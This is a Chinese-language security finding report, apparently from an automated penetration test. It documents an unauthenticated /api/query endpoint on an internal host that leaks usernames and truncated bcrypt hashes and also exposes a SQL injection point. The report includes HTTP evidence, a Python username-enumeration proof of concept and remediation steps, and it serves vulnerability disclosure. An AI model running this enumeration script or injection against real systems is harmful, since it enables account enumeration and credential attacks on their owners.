# /api/query 未认证可查询用户表并枚举账户（含口令哈希列）

**ID:** vuln-0005
**Severity:** MEDIUM
**Found:** 2026-10-31 04:13:26 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /api/query
**CWE:** CWE-306
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Medium

## Description

`/api/query` 接口未做任何认证即可查询用户表，返回用户 ID、用户名与口令哈希列。攻击者可据此枚举系统账户（admin、devops、m.garcia、svc_nexus、backup、monitor、operator 等），为后续口令喷洒、社工与针对性攻击提供输入。

## Evidence

未认证请求直接返回用户表：

```http
GET /api/query HTTP/1.1
Host: 10.0.93.73:18080

HTTP/1.1 200 OK
Content-Type: application/json

{"query":"SELECT","rows_returned":2,"columns":["id","username","email"],
 "rows":[[11874,"devops","$2b$12$03c8a2195a0ec51670e52c1f"],
         [26844,"m.garcia","$2b$12$c8281216f5491faacf96331f"]]}
```

通过 `q` 参数可枚举出更多账户（无需任何凭据）：

```http
GET /api/query?q=operator HTTP/1.1

HTTP/1.1 200 OK
{"query":"SELECT","rows_returned":1,"columns":["id","username","email"],
 "rows":[[5692,"admin","$2b$12$e134a1571b47232d0f3c0e71"]]}
```

实测可枚举出的用户名包括：`admin`、`devops`、`m.garcia`、`svc_nexus`、`backup`、`monitor`、`operator`、`a.chen`。`email` 列返回的是 bcrypt 口令哈希（被截断），而非邮箱地址。

## Impact

未认证攻击者可枚举系统账户名并获取口令哈希材料，形成有效的账户枚举通道；账户名可用于口令喷洒、钓鱼与权限探测，口令哈希列属于不应公开的凭据材料。该接口同时是 SQL 注入的入口（错误信息回显完整 SQL 语句），可与注入问题组合放大影响。

## Counterevidence

已确认不带任何 Cookie/Authorization/API Key 即可调用 `/api/query` 并得到用户表结构（id、username、email，其中 email 列实际为 bcrypt 哈希）。接口文档（`/swagger.json`）未声明安全方案，可能被设计为公开接口，但公开接口返回用户名与口令哈希仍是敏感数据暴露。返回的哈希被截断为 29 字符（完整 bcrypt 为 60 字符），无法直接离线破解，因此不夸大机密性影响；同时每次查询返回的用户记录存在随机化，疑似演示数据。未观察到任何鉴权或速率限制。

## Confidence Rationale

未认证返回用户记录已多次复现；返回数据每次请求存在随机化，可能为演示数据，但"未认证即可枚举用户名并获取口令哈希列"的行为稳定成立。

## What Would Change This Severity

若确认返回的是完整可用的口令哈希且可离线破解，或结合 SQL 注入可读取任意表与数据库凭据，则应提升至高危（High）。

## Technical Analysis

`/api/query` 由网关直接暴露，未接入认证/授权中间件：无会话、无令牌、无 API Key 校验即可调用。接口将 `q` 参数拼接到 SQL 的 `WHERE id = '<q>'` 中执行（错误响应暴露了完整语句 `SELECT * FROM users WHERE id = 'SELECT' LIMIT 20;`），并将结果集的 `id/username/email` 三列原样返回。

其中 `email` 列实际存放 bcrypt 口令哈希，说明数据模型/序列化层未做敏感字段过滤；接口也缺少行级授权，任何调用方都能读取任意用户记录。即使后续修复了 SQL 注入，未认证即可读取用户表与口令哈希的问题仍然存在，因此这是一个独立的访问控制缺陷。

## Proof of Concept

1. 未携带任何认证信息请求 `GET /api/query`。
2. 响应 200，返回 `columns=[id, username, email]` 与用户记录，`email` 列为 bcrypt 哈希。
3. 使用 `?q=<用户名>` 枚举账户，例如 `q=operator` 返回 `admin` 记录。
4. 汇总不同查询结果即可得到系统账户名列表。

```python
import requests

BASE = "http://10.0.93.73:18080"
seen = set()

# 默认查询 + 常见用户名猜测，均无需认证
for q in ["", "admin", "devops", "operator", "svc_nexus", "backup", "monitor", "m.garcia"]:
    r = requests.get(f"{BASE}/api/query", params={"q": q} if q else None, timeout=10)
    if r.status_code != 200:
        continue
    data = r.json()
    for row in data.get("rows", []):
        seen.add(row[1])

print("enumerated usernames:", sorted(seen))
```

## Remediation

1. 对 `/api/query` 实施认证与授权，仅允许经过身份验证且具备相应角色的调用方访问。
2. 查询接口不应直接返回口令哈希等凭据字段；响应模型应做字段白名单投影，移除 `password`/`hash` 类列。
3. 将用户查询限定为当前主体自身或管理员范围，避免任意账户枚举。
4. 对查询接口增加速率限制与审计告警，检测批量枚举行为。

## Assumptions

攻击者可直接访问 18080 端口，无需登录；`/api/query` 未在网关层要求任何认证。
